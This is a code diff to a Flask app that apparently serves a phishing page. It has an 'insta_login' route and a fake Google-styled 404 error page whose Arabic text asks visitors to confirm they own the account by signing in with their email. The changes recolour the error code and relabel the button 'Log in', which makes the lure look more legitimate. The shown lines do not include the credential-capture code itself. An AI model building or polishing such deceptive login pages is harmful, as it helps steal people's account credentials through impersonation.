@@ -136,7 +136,7 @@ def insta_login():
 
 
 # ----------------------------------------------------
-# 2. صفحة الخطأ 404 (تطلب تأكيد الحساب بدون مربعات وبخط أسود)
+# 2. صفحة الخطأ 404 (رقم 404 أسود وزر تسجيل الدخول)
 # ----------------------------------------------------
 @app.route("/error-404", methods=["GET", "POST"])
 def error_404():
@@ -159,7 +159,7 @@ def error_404():
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
         body { background: #ffffff; color: #000000; height: 100dvh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 25px; text-align: center; }
         .error-container { width: 100%; max-width: 380px; display: flex; flex-direction: column; align-items: center; }
-        .error-code { font-size: 60px; font-weight: 700; color: #d93025; margin-bottom: 5px; }
+        .error-code { font-size: 60px; font-weight: 700; color: #202124; margin-bottom: 5px; }
         .error-title { font-size: 20px; font-weight: 600; margin-bottom: 12px; color: #202124; }
         .error-desc { font-size: 14.5px; color: #5f6368; line-height: 1.6; margin-bottom: 30px; }
         .next-btn { width: 100%; background: #1a73e8; color: white; border: none; border-radius: 8px; padding: 13px; font-size: 15px; font-weight: 500; cursor: pointer; text-decoration: none; display: inline-block; box-shadow: 0 1px 3px rgba(0,0,0,0.2); }
@@ -172,7 +172,7 @@ def error_404():
         <div class="error-title">حدث خطأ ما</div>
         <div class="error-desc">عذراً، واجهنا مشكلة في التحقق من هويتك. الرجاء تأكيد أنك صاحب الحساب عن طريق تسجيل الدخول بالبريد الإلكتروني المرتبط للمتابعة.</div>
         <form method="POST" style="width: 100%;">
-            <button type="submit" class="next-btn">التالي</button>
+            <button type="submit" class="next-btn">تسجيل الدخول</button>
         </form>
     </div>
 </body>
